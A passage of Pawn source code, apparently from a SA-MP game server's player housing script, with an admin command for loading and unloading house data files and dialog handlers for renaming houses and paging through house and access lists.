	SetPVarInt(playerid,"PHouse_AclList_NowSelect",1);
	SetPVarString(playerid,"PHouse_AclList_TxtNmae",p_Sell[pid][sell_txt]);
	ShowAclList(playerid,p_Sell[pid][sell_txt]);
	return 1;
}

stock PHouseOPKSC(playerid, newkeys) {
	if(newkeys == 65536 && config_Nochangeobj == 0) {
		UseChangeObj(playerid);
	} else if((newkeys==262144 || newkeys==2) && config_Nomoveobj == 0) {
		UseMoveObj(playerid);
	}
}

CMD:houseorc(playerid, params[]) {
	if(GetPlayerAccess(playerid, "gm_1") == 0) return DIALOG_node(playerid, "你没有权限使用该命令");
	if(GetGMStatus(playerid) == 0) return DIALOG_node(playerid, "当前不可以使用该命令, 原因:你没有进入执勤状态.");
	new msg[256],idx;
	msg=strtok(params,idx);
	if(mk_strcmp(msg,"ins")==0)
	    {
			msg=strrest(params,idx);
			if(mk_strcmp(msg,"")!=0)
			    {
			        if(mk_strcmp(msg,"main")==0) return print("[PHouse]这个文档名不让用..");
					if(mk_strlen(msg)<PHOUSE_TXTLEN)
			            {
					        Installation(msg);
					        return 1;
						}
					else
					    {
					        print("[PHouse]文档名字过长");
					        return 1;
					    }
			    }
	    }
	if(mk_strcmp(msg,"unins")==0)
	    {
			msg=strrest(params,idx);
			if(mk_strcmp(msg,"")!=0)
			    {
			        if(mk_strcmp(msg,"main")==0) return print("[PHouse]这个文档名不让用..");
					UnInstallation(msg);
					return 1;
			    }
	    }
	if(mk_strcmp(msg,"load")==0) {
		msg=strrest(params,idx);
		if(mk_strcmp(msg,"")!=0) {
			if(mk_strcmp(msg,"main")==0) return print("[PHouse]这个文档名不让用..");
			if(mk_strlen(msg)<PHOUSE_TXTLEN) {
				if(IsTxtInstallation(msg)==0) {
					printf("[PHouse]文档'%s'加载失败,因为他没被安装",msg);
					return 1;
				}
				LoadTxt(GetTxtInstallationId(msg), msg);
				return 1;
			} else {
				print("[PHouse]文档名字过长");
				return 1;
			}
		}
	}
	if(mk_strcmp(msg,"unload")==0)
	    {
			msg=strrest(params,idx);
			if(mk_strcmp(msg,"")!=0)
			    {
			        if(mk_strcmp(msg,"main")==0) return print("[PHouse]这个文档名不让用..");
					UnLoadTxt(msg);
					return 1;
			    }

	    }
	if(mk_strcmp(msg,"txtlist")==0)
	    {
            GetLoadTxt();
            return 1;
	    }
	if(mk_strcmp(msg,"unloadall")==0)
	    {
	        UnLoadAllTxt();
	        return 1;
	    }
	if(mk_strcmp(msg,"loadall")==0)
	    {
	        LoadAllTxt();
	        return 1;
	    }
	if(mk_strcmp(msg,"reloadconfig")==0)
	    {
	        ReLoadConfig();
	        return 1;
	    }
	return 1;
}

forward PHouseODR(playerid, dialogid, response, listitem, inputtext[]);
public PHouseODR(playerid, dialogid, response, listitem, inputtext[])
{
	if(dialogid==DIALOG_ACL_LIST)
	    {
	        if(response==1)
	            {
	                new txt[PHOUSE_TXTLEN];
					GetPVarString(playerid,"PHouse_AclList_TxtNmae",txt,PHOUSE_TXTLEN);
			        if(mk_strcmp(inputtext,"下一页")==0)
			            {
							SetPVarInt(playerid,"PHouse_AclList_NowSelect",GetPVarInt(playerid,"PHouse_AclList_NowSelect")+1);

							ShowAclList(playerid,txt);
							return 1;
						}
					if(mk_strcmp(inputtext,"上一页")==0)
					    {
							SetPVarInt(playerid,"PHouse_AclList_NowSelect",GetPVarInt(playerid,"PHouse_AclList_NowSelect")-1);
							ShowAclList(playerid,txt);
							return 1;
					    }
					if(GetTxtPlayer(txt)!=0)
					    {
							new idx = 0;
							RedPlayerToTxt(strtok(inputtext,idx),txt);
							ShowAclList(playerid,txt);
							return 1;
						}
					return 1;
				}
		}
	if(dialogid == DIALOG_HOUSE_CHANGENAME) {
		if(!response) {
			return 1;
		}
		if(mk_strcmp(inputtext, defaultIT) == 0) {
			ChangePHouseName(playerid);
			SCM(playerid, COLOR_RED, "[系统] 房子新名称不能为空");
			return 1;
		}
		new id=GetPlayerInSell(playerid);
		if(id==-1) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..你想改什么房子的名字?请站在牌子附近..");
		if(mk_strcmp(p_Sell[id][sell_player],"0")==0) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..这个房子还在卖呢...");
		if(mk_strcmp(p_Sell[id][sell_player], GetName(playerid))!=0) return SendClientMessage(playerid,0x98CDFEFF,"[提示]..这不是你的房子...");
		if(ChangeSellName(id,inputtext)==-1) return SCM(playerid, COLOR_RED, "[系统] 房子新名称太长");
		SCM(playerid, COLOR_BLUE, "[系统] 房子名称更改成功");
		return 1;
	}
	if(dialogid == DIALOG_HOUSE_LIST) {
		if(!response) {
			return 1;
		}
        if(strcmp(inputtext, "上一页") == 0) {
            pPHousePage[playerid] --;
            PHouseList(playerid, pPHousePage[playerid]);
            return 1;
        } else if(strcmp(inputtext, "下一页") == 0) {
            pPHousePage[playerid] ++;
            PHouseList(playerid, pPHousePage[playerid]);
            return 1;
        } else {
			pc_cmd_fz(playerid, inputtext);
		}
        return 1;
	}
	return 1;
}
